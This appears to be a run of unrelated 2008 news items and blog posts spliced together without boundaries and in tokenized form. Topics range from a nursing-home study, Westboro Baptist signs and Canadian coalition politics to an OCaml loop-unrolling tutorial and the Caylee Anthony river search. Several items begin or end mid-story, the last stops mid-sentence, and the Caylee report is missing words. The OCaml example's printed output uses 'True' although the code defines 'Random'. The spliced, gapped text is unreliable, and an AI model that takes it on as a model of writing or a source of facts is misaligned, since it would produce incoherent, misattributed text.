The stockmarket offered only light relief for exporters .
The Nikkei benchmark index gained just over 5 % today , buoyed by speculation that George Bush will use part of a $ 700 bn federal bail - out package to rescue struggling US carmakers .
MANHATTAN , Kan. , Nov. 19 ( UPI ) -- U.S. researchers say they are looking at ways to make nursing home staff more comfortable accommodating the sexual needs of residents .
Gayle Doll , director of Kansas State University 's Center on Aging , says there are ways to give nursing home residents privacy for sexual expression -- either alone or with a partner .

Doll says that because nursing home staff do n't receive education in this area , they tend to either ignore or condemn sexual needs .
Majka Jankowiak and Laci Cornelison , research assistants at the Center on Aging , surveyed the staff before and after a workshop they presented .
The surveys , as well as anecdotal feedback from the participants , showed a marked change in attitudes .
" Part of it is that American society is not supportive of older people and sex .
It 's been a taboo and it's an even bigger taboo in nursing homes , " Jankowiak says in a statement .
" After the presentation , the participants felt more confident talking about it and dealing with sexual expression of residents . "
However , Alzheimer 's and dementia raise questions about the ability to consent and these conditions also may spur sexual behavior that 's inappropriate , the researchers say .
The research was presented at the American Association of Homes and Services for the Aging conference .
CHICAGO ( Reuters ) - U.S. scientists have developed a tiny sensor that can detect small amounts of cancer - causing toxins or trace the effectiveness of cancer drugs inside living cells .
The finding , reported on Sunday in the journal Nature Nanotechnology , offers a new tool for tracking specific chemicals in the body .
“ We made a very small nanosensor that can detect cancer - causing molecules or important therapeutic drugs inside of a single living cell , ” said Michael Strano of Massachusetts Institute of Technology in Cambridge , who worked on the study .
“ It ’s much smaller than a living cell in your body , ” Strano said in a telephone interview .
“ It ’s so small it can be placed into environments that are n’t accessible with larger sensors . ”
Strano said the sensors are made up of thin filaments of carbon molecules known as carbon nanotubes .
Several teams are using nanomaterials -- thousands of times smaller than the width of a human hair -- to develop new ways to deliver drugs in the body or improve diagnosis of disease .
For its sensors , Strano ’s team wrapped carefully shaped carbon nanotubes with DNA , which offers a binding site for DNA - damaging agents inside cells .
The sensors give off a fluorescent light that can be detected in the near - infrared light spectrum .
Because human tissues do not light up in this spectrum , the nanotubes stand out .
Strano said the light signal changes when the sensors interact with DNA inside cells .
These changes can help them identify specific molecules .
“ It ’s a way of fingerprinting chemistry , ” Strano said .
Because the sensors are coated in DNA , Strano said they can be safely injected into living cells .
“ Eventually the cell eats the protein off the coating and it essentially spits it out , ” he said .
He said the most immediate use of the technology will be as a very powerful tool for scientists to study the effects of very small amounts of a chemical .
But it could eventually be used as a new way to image the human body .
“ It ’s a new tool .
There is nothing else like it . ”
Bill Sizemore Goes to Jail
Yep , that 's Bill Sizemore being hauled off by Multnomah County Deputy Sheriffs , after Judge Janice Wilson read a lengthy opinion finding the initiative king in contempt of a 2003 judgment barring certain campaign activities ( like collecting nearly a million bucks for his personal use , in connection with his political activities ) .
Fortunately , Matt Davis was at the courthouse for an unrelated case , so he snapped the pic .
He could be out in just a few hours , as Judge Wilson ordered " him jailed until he purges himself of contempt by signing the required forms and reports and filing them , " or until June 1 , 2009 , whichever comes first .
Sizemore 's attorney indicated the papers would be signed and filed later today .
Judge Wilson said something along the lines of believing it when she sees it , and until then , he 's in jail .
( And here 's his booking page . )
" He holds the keys to that lock , " noted Richard Schwarz , of AFT - Oregon , one of the plaintiffs in the case .
Judge Wilson also ordered Sizemore to repay the money he 's collected , with the amount to be determined in a future hearing .
More details to follow .
Church seeks ' Santa Claus will take you to hell ' sign to accompany Nativity display John Byrne
Published : Thursday December 11 , 2008

The " church " that picketed gay hate crime victim Matthew Shepard 's funeral and blamed Iraq war deaths on US tolerance of gays has a new message : Screw Santa .
The church has asked Washington Gov. Chris Gregoire 's office to put up a sign near its holiday display that says " Santa Claus will take you to hell " among other religious statements in the state capitol 's hallway .
In an effort to be inclusive , the state has added signs mocking atheism , an atheist sign celebrating the winter solistice and a sign mocking religion as " myth and superstition " that enslaves minds alongside a more typical Nativity display .
" The Westboro request is under consideration by the state Department of General Administration , which also has a request for a display depicting ' The Spaghetti Monster ' and 'a Christian woman in Bellevue who wants to erect a sign offering blessings on all people , ' " the Daily Olympian 's Brad Shannon noted Thursday .
" ' Church of the Flying Spaghetti Monster ' is a parody of the Kansas education - board decision to teach ' intelligent design ' as an alternative to Darwinist evolutionary concepts in biology classes . "
" Also under consideration is a request for a ' Festivus ' pole , " adds Sherman , " a reference to the mock holiday ' Festivus for the Rest of Us ' popularized by Seinfeld in the late 1990s . "
The Santa message is nothing if not outrageous , in the spirit of previous Westboro Baptist messages .
" You 'd better watch out , get ready to cry , You 'd better go hide , I 'm telling you why ' cuz Santa Claus will take you to hell .
He is your favorite idol , you worship at his feet , but when you stand before your God He wo n't help you take the heat , " the proposed sign reads .
" So get this fact straight : you 're feeling God 's hate , Santa 's to blame for the economy 's fate , Santa Claus will take you to hell . "
KANSAS CITY , Mo. , Nov. 18 ( UPI ) -- Police in Kansas City , Mo. , said attempted carjackers were forced to abort their theft when the vehicle turned out to have a manual transmission .
Investigators said two males , an adult and a juvenile , approached a woman sitting in her car outside of a store at about 11 p.m.
Monday and one of the suspects pointed a gun at the woman , The Kansas City ( Mo. ) Star reported Tuesday .

The suspects ordered the woman to hand over her cell phone and exit the car , police said .
However , officers said the suspects exited the car quickly after attempting to drive off because they were unable to work the manual transmission .
Police said two suspects in the crime were arrested shortly after the incident following a street robbery on the University of Missouri - Kansas City campus .
Cover songs play a vital role in the music industry .
Many bands have been launched on the back of a great cover – going on to perform and record original music .
There have also been a number of artists who are already great in their own right who have a hit with a cover song .
This list deals with the latter category .
If you know of other excellent covers that are better than the original , be sure to mention it in the comments .
10 Joe Strummer Redemption Song
Original : Bob Marley
One of many covers that The Clash and Strummer did over the years , and also The Clash is also a highly covered band .
It was not uncommon in the late 70s and early 80s for English and American bands to cover reggae songs and ‘ bring them to the masses ’ .
9 Gary Jules Mad World
Original : Tears for Fears
From the Donnie Darko soundtrack , this cover of the Tears for Fears track is an infinitely better version of the song , and also a perfect piece of music for the dark themes explored in the movie .
8 Happy Mondays Step on
Original : John Kongos
Classic
Ryder take on great rambling dance hall shuffle from South Africa .
While the lyric
‘ Oh he lied , oooh he ’s twistin ’ my melon man ’ sounded perfectly logical coming from Shaun Ryders Ecstasy fuelled mind , it was n’t his line .
7 Petshop Boys Always on my Mind
Original : Brenda Lee
Neil Tennant always had an ear for the sublime hook .
And with this cover of Brenda Lee ’s 1972 song , that was also covered by Elvis Presley ( 1972 ) Wilie Nelson ( 1982 ) , the Petshop Boys took the song to a UK Number One .
6 Tricky Black Steel
Original : Public Enemy
An agitated mesh of distorted trip hop layered electronica , growls and most the introduction to the world of the stunning Martina Topley - Bird on lead vocals .
Tricky credited Public Enemy with being a massive influence on him , but along with Massive Attack and Portishead , Tricky was massively influential in creating the Bristol Sound , or Trip Hop .
5 They Might Be Giants Istanbul ( Not Constantinople )
Original : The Four Lads
A strange piece this one , but every time I hear it , I ca n’t help but start nodding and tapping my feet .
From the hugely underrated album Flood this song by the two Johns was one of their break through hits , alongside Particle Man and Birdhouse in your Soul .
4 Johnny Cash Hurt
Original : Trent Reznor
Reznor was famously was quoted as saying ‘ that song is n’t mine anymore ’ and earned Cash a Country Music Award for Single of the Year .
The music video for the Cash version features footage from his life .
3 Youth Group Forever Young
Original : Alphaville
Broke this Sydney band on the world stage when their cover of the German trio Alphavilles 80s hit Forever Young was played on an American soap opera The OC .
2 Nirvana Man who sold the world
Original : David Bowie
Was played endlessly by MTV following the news of Kurt Cobain ’s passing .
This cover of the Bowie song from the 1994 Nirvana album Unplugged in New York showed that there was a lot more to Cobain than the howling grunge sound that Nirvana among others had pioneered .
1 Sinead O’Connor Nothing Compares to you
Original : Prince
Sinead O’Connor had a world wide number one hit in 1990 with this cover of the Prince track originally performed by The Family in 1985 .
O’Connor ’s version is the definitive version , and after the song became a number hit in the US , Australia , Germany and the UK , Prince even began to perform the song at his live shows .
+ Jeff Buckley Hallelujah
Original : Leonard Cohen
Was always going to make this list , for its break through that it gave Jeff Buckley .
Although Cohen ’s version is actually more moving , the Buckley cover reached a newer generation that had not heard of Cohen .
Today something a bit technical once again .
Only suitable for people knowing something of ML etc .
In compilers , semantics and program analysis it ’s sometimes handy or needed to transform loops into nested if ’s .
Perhaps for efficiency reasons , for precision of some invariant detection , or perhaps to know the meaning of a loop up to some defined iteration .
Unrolling a loop twice consists of the transformation from
while ( B ) { C ; }
to the following nested if statements :
if ( B ) { C ; if ( B ) { C ; while ( B ) { C ; } } }
Recently , I thought about how to do that ( more or less ) elegantly given an abstract syntax tree of the loop .
Here my approach in Ocaml .
First , we start with a simple language of only boolean expressions and some commands .
type bexp = Random and cmd = Skip | Assign | Seq of cmd list | If of bexp * cmd * cmd | While of bexp * cmd
We have a boolean expression Random and the usual commands cmd : Skip , Assignments , Sequences , If , and While constructs .
Let ’s define a simple loop :
let loop1 = While ( Random , Assign )
Which corresponds to something like while ( Random ) { Assign ; } .
Obviously , the commands and boolean expressions are not really useful , but that ’s just for demonstration purposes — it could easily be replaced with real AST constructs .
Next , let ’s write out how we would like to have the first unrolling look like :
let unrolled1 = If ( Random , Seq [ Assign ; loop1 ] , Skip )
Which corresponds to something like if ( Random ) { Assign ; While ( Random ) { Assign ; } else { Skip ; } .
All we did is taking the body of the loop , wrapping it in an if , given the guard of the body , and concatenating the whole loop to the then - branch .
How do the second and third unrolling look like ?
let unrolled2 = If ( Random , Seq [ Assign ;
If ( Random , Seq [ Assign ; loop1 ] , Skip ) ] , Skip )
let unrolled3 = If ( Random , Seq [ Assign ;
If ( Random , Seq [ Assign ;
If ( Random , Seq [ Assign ; loop1 ] , Skip ) ] , Skip ) ] , Skip )
Ok , we see a very repetitive structure ( obviously ! ) .
Let ’s try to write some functions which solve our problem .
The first pattern we see is the following : If ( GUARD , Seq [ BODY ; REMAINING ] , Skip ) .
Basically , we can generalise the stuff written in capitals with arguments of a function :
let buildIfSkip guard body remain =
If ( guard , Seq [ body ; remain ] , Skip )
Given the body and guard of loop1 we could now curry buildIfSkip as follows :
let doRemain = buildIfSkip Random Assign
The function doRemain has only one argument which defines what gets put in REMAINING .
That ’s already it , almost !
The first unrolling we get by :
doRemain ( doRemain loop1 )
which produces
If ( True , Seq [ Assign ; If ( True , Seq [ Assign ; While ( True , Assign ) ] , Skip ) ] , Skip )
All which is needed now is a function which parametrises all of this .
It needs to do the following :
Take a loop , get the guard and the body of it
Produce the function doRemain as shown above
recursively apply doRemain to itself
Here ’s the complete function :
let unroll loop n = let guard , body = match loop with | While ( guard , body ) -> guard , body |_ -> raise Not_found in let buildIfSkip guard body remain =
If ( guard , Seq [ body ; remain ] , Skip ) in let doRemain = buildIfSkip guard body in let iterate n f v = let rec iter v = function 0 -> v |n -> iter ( f v ) ( n - 1 ) in iter v n in iterate n doRemain loop
To check we can do the following :
# unroll loop1 3 = unrolled3 ; ;
- : bool = true
#
Feel free to use the code 🙂
Fresh off of Quantum of Solace director Marc Forster has been tapped for the screen adaptation of World War Z .
We get word of this project thanks to our friends at comingsoon :
Paramount Pictures has set Quantum of Solace director Marc Forster to helm World War Z , based on the Max Brooks best - selling novel about a worldwide infestation of flesh - eating zombies , reports Variety .
Changeling scribe J. Michael Straczynski is writing the screenplay , and Brad Pitt ’s Plan B is producing .
Max Brooks has the genetics to win at life and it pleases me to see Brooks son of Brooks in the writing racquet .
I have n’t read World War Z , so I have no opinion on it .
I beseech my international friends to fill me in with your thoughts .
Have any of you had the chance to read this book ?
If so – what did you think about it and are you excited to see it made into a film ?
Mark A. W. Andrews , professor of physiology and director of the Independent Study Pathway at the Lake Erie College of Osteo­pathic Medicine , replies :
Generally speaking , heaviness of the muscles around the eyes , including the levator muscles that open the upper eyelids , is similar to fatigue of any muscle of the body .
Ocular and brow muscles are especially prone to fatigue because they are active for most of our waking hours .
Over the course of the day , they gradually grow leaden with extended use , as our arms and legs do .
Such a feeling may be compounded by general fatigue , including a lack of sleep , or by specific muscle overuse related to long hours of focusing on , say , a computer monitor .
Excess skin of the eyelid , or prolapsed fat pads underneath the eyes , makes an individual more prone to this sensation .
Chronic allergies and sinus infections may also exacerbate the heaviness , and sun exposure may cause eyelid swelling and thereby increase the probability that the drooping will interfere with vision .
Although heavy eyelids do not typically indicate underlying medical issues , some conditions do cause drooping eyelids , or ptosis .
A stroke or a muscular disorder such as myasthenia gravis or myotonic dystrophy can damage facial muscles or their nerves and cause ptosis , as can elective facial surgery or interventions such as Botox injections to the brow .

Canadian politics are currently so full of uncertainties -- some unavoidable , others intentional -- that predictions are mere speculations .
So let 's move on to what we actually know about the constitutional and political situation .
MPs are everything
Canadians never vote directly for a " government . "
Instead , we elect a member of Parliament in our local constituency .
It is only after 308 individual MPs have been chosen that the process of forming a government begins .
The Constitution Act of 1867 does n't even mention the prime minister or political parties .
MPs are everything .
How MPs organize themselves is entirely up to them .
This is why two MPs are able to currently sit as independents ; there could just as easily be 308 of them .
Most MPs have organized themselves into groupings known as parties .
This simplifies the process of forming government but does n't change the constitutional pre-eminence of individual MPs .
There is just one basic requirement :
The government must at all times enjoy the confidence of the majority of MPs in the House of Commons .
By unwritten constitutional convention , the Governor General calls upon the leader of the party with the most MPs and asks him or her to try to form a government that enjoys the confidence of the House .
When that party holds a majority of the seats , the result is a foregone conclusion .
This gives rise to the illusion that parties win the " right to govern . "
But they just get to try to form a government first , and happen to have enough seats to deliver .
Things are different when no party emerges from the election with a majority .
Again , the Governor General calls upon the leader of the party with the most MPs and asks them to try to form a government that enjoys the confidence of the House .
To obtain that confidence , the newly designated " prime minister " must persuade MPs from other parties to provide their support .
If he or she fails , it is open to another party ( or parties ) to indicate that they can get the job done -- whereupon the Governor General will let them try .
Since the 308 individual MPs whose preferences drive this process are directly elected by Canadians , all of this is entirely democratic .
A whiff of tyranny
The current whiff of tyranny comes from Stephen Harper , who has deliberately misled Canadians by asserting that " Stéphane Dion does not have the right to take power without an election . "
To the contrary , Dion has the right -- provided , again , that the Governor General asks him to try to form a government .
Later today , Harper will likely ask the Governor General to prorogue ( in essence , recess ) Parliament , enabling him to dodge two confidence votes on Monday .
A new parliamentary session would begin in the New Year .
The Governor General should n't heed his request , and here is why .
Normally , the Governor General is just a figurehead .
Most of her powers can only be exercised with the advice and consent of the government .
But she is not bound by the advice of a prime minister who has lost the confidence of the House -- as Harper all too evidently has done .
The publication of a coalition agreement by Stéphane Dion , Jack Layton and Gilles Duceppe proves that Harper is prime minister in name only .
Michaëlle Jean can , and should , be taking her advice from Dion .
That said , the Governor General might agree to prorogue Parliament in order to avoid Harper 's wrath .
But this would reward bad behaviour while only delaying the inevitable , since the Conservatives will be defeated at the first opportunity .
Nor can Jean escape the spotlight : if she agrees to prorogue , she 'll have to read the speech from the throne in January , and then see it defeated .
We elect MPs to decide
The Conservatives argue that Canadians did not vote for a Liberal / NDP coalition supported by the Bloc Québécois .
But we live in a parliamentary system rather than a direct democracy .
MPs are elected to go to Ottawa , debate issues in depth , and make decisions based on the information they acquire .
They are not bound by a precise , predetermined electoral program .
They are not even bound to stay in the same party , as Stephen Harper demonstrated when he persuaded David Emerson to become a Conservative in January 2006 , just two weeks after having been elected as a Liberal .
Countries with electoral systems that are more representative than ours , including Australia , New Zealand and Israel , are accustomed to coalitions being formed after the results come in .
Again , it is in no way anti-democratic to allow the majority of recently elected MPs to decide who will form government .
Nor is it improper for them to discuss a possible coalition -- or indeed just about any other matter -- in advance .
Who 's afraid of the Bloc ?
The Conservatives claim that the Liberal / NDP deal with the Bloc Quebecois is improper because of that party 's separatist agenda .
Putting aside the fact that Stephen Harper concocted a similar arrangement with the Bloc in an attempt to defeat Paul Martin 's minority government , this argument disrespects the millions of Canadian citizens who voted for Duceppe 's party .
They were n't just voting for separatism ; they were voting for a social democratic party with a full range of policy positions , many of them quite similar to those of the NDP .
Indeed , the Bloc did not even campaign on separation in the last election .
Instead , it ran against Harper and his economic , social , cultural and environmental policies ( or lack thereof ) .
It is also significant that the Bloc has agreed to support the coalition for at least 18 months despite the fact that Liberals and NDP refused to make any concessions on the status of Quebec in Confederation .
In other words , Jack Layton and Stéphane Dion stood up for a united Canada during the negotiations .
As for Duceppe , he knows there 's little support in his province for separation right now .
The deal with the Liberal / NDP coalition provides him with an excuse for ignoring the issue .
Harper is the issue
Stephen Harper is the predominant issue for all three opposition parties .
Frustration over his policies hit a boiling point with the release of the economic update last week .
Eliminating public financing for political parties , stripping the right to strike from civil servants , misleading Canadians about the state of federal finances and refusing to advance an economic stimulus for an economy in free - fall -- all this piled on top of a long list of previous grievances .
More than anything , it is Harper 's confrontational style and his penchant for deception and personal attacks that have turned MPs from all four parties against him .
Jack Layton could have sat back and watched Harper put the boots to the Liberal Party .
In his five years as leader , Layton has steadily increased the number of NDP seats from 13 to 37 .
He has developed a fundraising machine that rivals the Liberals and greatly exceeds the Bloc and Greens , making his the only opposition party that could survive without public financing .
As Bill Tieleman argued in these pages ( from , I think , a narrow party perspective ) , inaction on the part of the NDP might have been the best strategy .
It would also have been wrong .
Making Parliament work
MPs are elected to make Parliament work , and Layton has excelled at that .
It was because of Layton that Paul Martin 's 2005 budget included $ 1.4 billion for affordable housing .
It was because of him that the Climate Change Accountability Act was adopted by the House of Commons in June 2008 , with support from both the Liberals and Bloc .
It was because of Layton that the residential schools apology took place in the symbolically important venue of the House of Commons -- a fact publicly acknowledged by Harper in a rare moment of magnanimity .
Conceivably , the NDP could benefit electorally from being in cabinet .
It 's important to be the conscience of Parliament and a source of progressive ideas ; it 's better to put those ideas into action .
At the same time , nobody is thirsting for power in the midst of the worst economic crisis since the Great Depression .
For all the good that it accomplishes , the coalition will still be blamed for negative developments beyond its control .
For all these reasons , the coalition is a " power grab " in one sense only .
Stephen Harper has demonstrated that he 's a thoroughly dangerous driver .
With support from the Bloc , the Liberals and NDP are taking away the keys .

Dynamic demand technology , in which domestic appliances adjust their drain on the national grid so as to smooth out collective spikes and dips , is to get a widespread UK trial next year .
The Guardian , reporting on the new initiative from the Department of Energy and Climate Change , says that three thousand intelligent demand - smoothing fridges will be given away free by the government in a sort of energy - policy beta test .
As any fule kno , the UK national grid 's frequency rises and falls from its base level of fifty Hertz in response to demand variations against supply .
As more electric power is used , the frequency changes .
Once a certain limit is passed , more power stations will come on line and the frequency will move back to the nominal level .
The idea of " dynamic demand " , or " intelligent " appliances is that they contain circuitry which monitors the mains frequency .
A fridge normally waits until it has warmed up to a certain amount above set temperature , then runs its pumps until it is a certain amount below .
A smart fridge , though , would also take account of the grid frequency .
When the grid was under strain it might not bother cooling all the way down - it might stop as soon as it reached , say , the middle of its normal temperature band .
Immersion heaters and air conditioning are other examples where dynamic - demand hardware could be useful .
Dynamic demand does n't reduce the amount of energy required over time - it merely spreads the demand out so as to make things easier on the grid .
This is why the government 's 2009 smart - fridges must be given away free ; they wo n't offer any savings for their users .
But the quick - response gas turbine power stations used to iron out sudden gaps between supply and demand are dirtier than most - efficient combined - cycle kit can't be thrashed up and down the output scale the way these plants have to be .
Thus the government reckons that dynamic - demand tech could could reduce UK carbon emissions , perhaps by as much as 2 million tonnes annually - a little over 1 per cent of the total .
That sounds pretty high - even Friends of the Earth , great boosters of this idea , have previously suggested just half a million tonnes a year ( one - third of one per cent ) .
And the power industry would save money on maintenance for thrashed turbines and backup plant which is left idle much of the time , so they 're very much in favour of someone else paying to smooth out consumer demand for them .
Greens such as the FoE people like dynamic - demand too , as it could make life easier for renewable power .
The thinking goes that the nation 's fridges , aircon , immersion heaters etc could be set to take power when the wind was blowing or the sun shining and the grid was thus overpowered , rather than essentially randomly as they do now .
The idea is examined by Professor J C MacKay of Cambridge University in his book Sustainable Energy - Without the Hot Air , just published in hard copy .
He says that 's not really true .
Popular soap operas such as Coronation Street and EastEnders typically generate TV pick - ups of 600 – 800MW … automatically switching off every fridge would nearly cover these daily blips of concerted kettle boiling .
Fluctuations in wind power will be a different matter .

Oddly enough , I just write a piece for this blog a few days ago , Building A Greenwash Crisis Plan , looks like Executive Recycling could use one .
The 60 minutes report last night , The Electronic Wasteland , uh…certainly gave them cause to need one !
This is a bit of a chilling tale for any eco entrepreneur !
Executive Recycling , a small Colorado based , e- waste recycling center , was founded by Brandon Richter in 2004 with high hopes to provide a green solution to a growing problem .
As he put it :
You think that you are doing good sending your computers to a recycling company .. but that is not exactly the case ..
“ Your e-waste is recycled properly , right here in the U.S. – not simply dumped on somebody else . ”
I ’m going to give Richter the benefit of the doubt here .
When the dreaded call from 60 minutes came ( You all know the joke do n’t ’ you ?
“ What are the 5 most dreaded words a CEO can hear ?
“ This is 60 Minutes calling . ” )
Richter gladly agreed to help them and gave them access to his records .
Things obviously did n’t turn out so well , since 60 Minutes found that containers of used monitors left his facility and were shipped overseas , ending up contributing to the virtual destruction of a town in China that dismantles all kinds of e-waste .
A snip from the broadcast transcript …
And Brandon Richter , CEO of Executive Recycling , was still warning of the dangers of shipping waste to China .
“ I just heard actually a child actually died over there breaking this material down , just getting all these toxins , ” he said .
Then Pelley told him we ’d tracked his container to Hong Kong .
“ This is a photograph from your yard , the Executive Recycling yard , ” Pelley told Richter , showing him a photo we ’d taken of a shipping container in his yard .
“ We followed this container to Hong Kong . ” “ Okay , ” Richter replied .
“ And I wonder why that would be ? ” Pelley asked .
“ Hmm . I have no clue , ” Richter said .
“ The Hong Kong customs people opened the container …and found it full of CRT screens which , as you probably know , is illegal to export to Hong Kong , ” Pelley said .
“ Yeah , yep , ” Richter replied .
“ I do n’t know if that container was filled with glass .
I doubt it was .
We do n’t fill glass , CRT glass in those containers . ”
“ This container was in your yard , filled with CRT screens , and exported to Hong Kong , which probably would n’t be legal , ” Pelley said .
“ No , absolutely not .
Yeah , ” Richter said .
“ Can you explain that ? ” Pelley asked .
“ Yeah , it ’s not – it was not filled in our facility , ” Richt er said .
Richter then went on to make things worse – becoming defensive .
“ I know this is your job , ” Richter told Pelley .
“ But , unfortunately , you know , when you attack small business owners like this and you do n’t have all your facts straight , it ’s unfortunate , you know ? ”
What happened here ?
It seems Richter really was n’t aware of what was happening in his facility .
What can he do now ?
Well , this morning they put out a press release .
( update : link to press release is down try here )
Seems like a good start , but still a wee bit defensive .
Let ’s go back to my recommendations .
You probably will have to do some things that are n’t green , but try to do as few as possible .
Be honest with your customer ’s about the things you do n’t do green and tell them why
Be vigilant !
Make every one of your employees the “ green police ” .
Set up a feedback system so they can tell you what ’s not eco and let them give suggestions on how to fix it .
Get your customers involved .
Set up a greenwatch page on your web site .
Solicit ideas from your customers .
Continuous Improvement .
Keep customers informed about your efforts to continually go greener .
What other suggestions do you have ?
Mr Richter - if you ’re reading – let us know what you think !
Update : the link to the press release on the Executive Recycling Site no longer works … hmmm… but , I found the text here .
So read away and let us know what you think !
ASHLAND , Ohio ( CNN ) --
An Ohio bakery shut down in October is bustling again , with 60 eager employees who had expected a Christmas on the unemployment rolls .
Cookie production has resumed and some workers are back on the job at the Archway factory in Ashland , Ohio .
Some 300 workers lost their jobs when the Archway cookie factory in Ashland , Ohio , was suddenly closed by the private equity firm that owned it .
The workers also were left without benefits like health insurance .
But then Lance Inc. , a Charlotte , North Carolina - based snack food company , purchased Archway at a bankruptcy auction .
And last week 60 workers were asked to return immediately , with perhaps more coming back in the months ahead .
Kathy Sexton , a worker at the bakery , had been preparing her children for a very modest holiday .
Watch the holiday brighten for workers »
" They said they understood , " Sexton recalls .
" They said , ' That 's all right , Mom . '
You always want to give them more , but ... I did n't think I would be able to . "
Now she can .
Tiny Ashland has been struggling .
Ohio has lost 200,000 jobs over the past eight years .
The recent presidential campaign saw both candidates visiting frequently .
The outlook in Ashland became especially bleak when the Archway plant closed .
Workers at the bakery said they felt betrayed when Archway at first said there would be more work in a day or two , but then changed the locks .
Rita Devan remembers .
" They just kept taking and taking until there was nothing left to take , " Devan says , " and they did n't care that they were putting 300 people out of work . "
Things are different now .
When it promised to reopen the bakery , Lance gave all 300 former Archway workers a $ 1,500 prepaid debit card .
" I was crying , " Devan says of the gift .
" I am like , ' What are these people doing ?
They do n't know me .
They do n't know us .
They do n't know any of the Archway people .
And they are giving each and every one of us $ 1,500 . ' "
Sexton -- the woman who'd been preparing her kids for a meager holiday -- says of the $ 1,500 gift : " It was awesome .
My first thought was , ' I can give my kids a Christmas . ' "
David Singer , CEO of Lance , says the gift cards were a way of letting Ashland know the new owners are different .
" We would n't do it willy - nilly , " Singer says .
" We do want to make money .
But this is the pool of folks that we intend to hire .
We just wanted to let them know who we were . "
The 60 workers rehired so far are earning their previous salary and retained their seniority .
They also were provided health insurance from day one .
The bakery now produces Lance cookies that are sold to big chains like Target and Wal - Mart .
But production of Archway cookies is scheduled to resume soon .
Lance has told the employees that it hopes to have the plant fully operational by the end of 2009 -- that is , five lines of cookies being produced simultaneously .
The new owners say that if new orders keep flowing in , more jobs will follow .
Terry Mowry is another worker rehired by Lance .
He says what has happened is hard to describe : " You just saw life being breathed right back into the face of these people . "
And Devan says with a laugh : " I walked into the garage last night , and my husband says , ' You actually smell like a cookie again . ' "
" He said , ' Boy , I missed that smell . ' "

US Secretary of State Condoleezza Rice has told Pakistan that there is ' irrefutable evidence ' of involvement of elements in this country in the Mumbai terror attacks and it had no option but to act urgently and effectively to avert a strong international response .
Rice ' pushed ' the Pakistani leaders to move against the perpetrators of the terror strikes warning that ' otherwise , the US will act , ' the ' Dawn ' reported on Saturday .
The clear message was conveyed to Pakistan 's top leadership by Rice during her brief stopover in Islamabad on Thursday , diplomatic sources said , giving credence to the report .
Rice said that there was ' irrefutable evidence ' of the involvement of Pakistani elements in the Mumbai attacks , the sources said .
She travelled to Pakistan after a visit to India , where she was shown the extensive evidence gathered by investigators to prove the linkages between the Mumbai attackers and Pakistan - based elements , especially the banned Lashker - e- Toiba terror group , the sources said .
They said Rice , during her interactions with President Asif Ali Zardari , Prime Minister Yousuf Raza Gilani , Foreign Minister Shah Mehmood Qureshi and Army Chief Gen Ashfaq Parvez Kayani , made it clear that Pakistan needs to act effectively to bring the perpetrators to justice .

No one disputes that American academia is decidedly more liberal than the rest of the population , or that there is a detectable shift to the left among students during their college years .
Still , both studies in the peer - reviewed PS , for example , found that changes in political ideology could not be attributed to proselytizing professors but rather to general trends among that age group .
As Mack D. Mariani at Xavier University and Gordon J. Hewitt at Hamilton College write in the current issue , “ Student political orientation does not change for a majority of students while in college , and for those that do change there is evidence that other factors have an effect on that change , such as gender and socioeconomic status . ”
That may be , said Daniel Klein , an economist at George Mason , but those results do n’t necessarily mean there is n’t a problem .
Mr. Klein , whose research has shown that registered Democrats vastly outnumber Republicans among faculty in the humanities and social sciences at American colleges and universities , maintains that the focus on the liberal - conservative split is misdirected .
Such terms are vague and can be used to describe everything from attitudes about religion and family to the arts and lifestyles , he said .
The real issue , said Mr. Klein , who calls himself a libertarian , is that social democratic ideas dominate universities  ideas that play down the importance of the individual and promote government intervention .
Such “ academic groupthink ” means that the works of such thinkers are not offered enough , he argues .
“ A major tragedy is that they ’re not getting exposed to the good stuff , ” he said , citing the works of John Stuart Mill , Adam Smith , Friedrich Hayek and Milton Friedman .
“ Even if we had hard , definite evidence that students were n’t influenced by their professors , there is still reason for great concern about the composition of the faculty , ” Mr. Klein added .
K. C. Johnson , a historian at the City University of New York , characterizes the problem as pedagogical , not political .
Entire fields of study , from traditional literary analysis to political and military history , are simply not widely taught anymore , Mr. Johnson contended : “ Even students who want to learn do n’t have the opportunity because there are no specialists on the faculty to take courses from . ”
“ The conservative critics are inventing a straw man that does n’t exist and are missing the real problem that does , ” he added .
Novell Cancels BrainShare Conference After 20 Years
by Ostatic Staff - Dec. 17 , 2008
Novell 's Senior Vice President and Chief Market Officer , John Dragoon announced today that it has cancelled its annual conference , BrainShare , after more than 20 years .
In an open email to Novell 's customers and partners , Dragoon says the move is in response to industry - wide budget tightening and a generally sluggish economy .
" I also know that our customers and partners always look forward to this conference .
Despite this , many of you have indicated that because of the current economic climate , you are under increasing pressure to reduce travel and other controllable expenses and are hesitant to commit to attending our Brain Share 2009 conference , " says the email .
Instead of the traditional in - person conference originally slated for March of next year , Novell plans to offer online classes and virtual conferences to make education and training available to more people at a lower per -head cost to companies .
Though the cancellation of BrainShare after 20 years will no doubt come as a surprise to many people , I hope is a harbinger of things to come .
While I know there is tremendous value in educational conferences , there are so many these days -- many that simply regurgitate the same information to the same attendees -- that their value is quickly becoming diluted .
Furthermore , tech workers are no longer concentrated in Silicon Valley and other urban areas .
Yet the east and west coasts are the primary hosts of these important events , making them largely inaccessible to the busy developers and engineers they 're meant to attract .
Some may see the cancellation of BrainShare as a sign of doom and gloom .
I see it as a response to the changing needs of companies , developers , and the open source community at large .
Caylee Anthony Searchers Find Bag of Toys , Bones ( Photos )
Orlando television station WFTV in Orlando is reporting that divers working for bounty hunterhave been combing the Little Econ River for any clues in the disappearance of The dive team found a plastic bag weighted down by two bricks that contained several toys and what looked like 3 or 4 bones .
The toys included a plastic shamrock .
The FBI was called in and they removed the evidence from the scene .
They were reportedly very skeptical and would not give credence to speculation that the findings have anything to do with the Caylee Anthony case .
Orange County Sheriff 's deputies also examined the items .
Padilla acknowledged that the bag could have been planted as a hoax .
Caylee Anthony 's grandmother Cindy Anthony said , " I have n't heard anything from the authorities and when they come tell us something we 'll deal with that . "
She added that she thought all of Caylee 's toys had been accounted for .
Padilla had organized the new search in the Little Econ River because of a cross that was discovered on a nearby tree .
The dive team has been working in Blanchard Park since 9:00 a.m. on Thursday .
They are made up of experienced , ex-law enforcement and military types .
The group of 30 divers work for Orlando based Blackwater Divers and are volunteering their time to search a one mile stretch of the river using underwater communications and dragging large nets to scrape the river 's bottom .
The biggest challenge , according to Padilla , is the presence of alligators .
Casey Anthony , Caylee 's mother , was indicted on October 14th and charged with first degree murder by an Orlando grand jury .
She remains in jail .

Shockingly , there are now 31.6 million people who use food stamps in the United States - that 's 1 in 10 Americans unable to feed themselves .
There have been more than 1.2 million jobs lost over the past 3 months , the
